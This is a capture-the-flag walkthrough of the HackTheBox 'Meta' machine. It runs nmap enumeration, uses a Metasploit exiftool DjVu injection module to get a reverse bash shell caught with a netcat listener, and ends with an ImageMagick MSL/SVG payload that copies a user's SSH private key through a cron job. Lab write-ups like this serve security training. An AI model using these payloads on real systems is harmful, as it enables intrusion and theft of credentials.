# Meta Hackthebox

## Enum

### Nmap

```bash
host=10.10.11.140;ports=$(nmap -p- --min-rate=1000 -T4 $host | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) ;nmap -sC -sV -p$ports $host | tee nmap.txt
```
[nmap.txt](nmap.txt)

### gobuster


### Wfuzz
[wfuzz.txt](./wfuzz.txt)

There is `dev01` subdomain.

## Foothold


```bash
msf6 > search exiftool

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection
   1  exploit/multi/http/gitlab_exif_rce                        2021-04-14       excellent  Yes    GitLab Unauthenticated Remote ExifTool Command Injection


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/gitlab_exif_rce

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_bash
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > options

Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.jpg          yes       Output file


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.25.78.11     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   JPEG file


msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set LHOST tun0
LHOST => tun0
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run

[+] msf.jpg stored at /root/.msf4/local/msf.jpg
```
Upload the image via browser and start listener => We got reverse shell

```bash
┌──(root㉿BOP-PC)-[/home/bop/Workspace/hackthebox/meta]
└─# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.140] 48786
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@meta:/var/www/dev01.artcorp.htb/metaview$

www-data@meta:/var/www/dev01.artcorp.htb/metaview$
```

```bash
ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

```bash
root:x:0:0:root:/root:/bin/bash
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
```

find file
```bash
find /dir/path -type f -printf "%T@ %p\n" | sort -n | cut -d' ' -f 2- | tail -n 1
```

```svg
<image authenticate='ff" `cat ~/.ssh/id_rsa | tee /dev/shm/rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>

```
put the file on server at `/var/www/dev01.artcorp.htb/convert_images` and wait till the cron job run with user `thomas`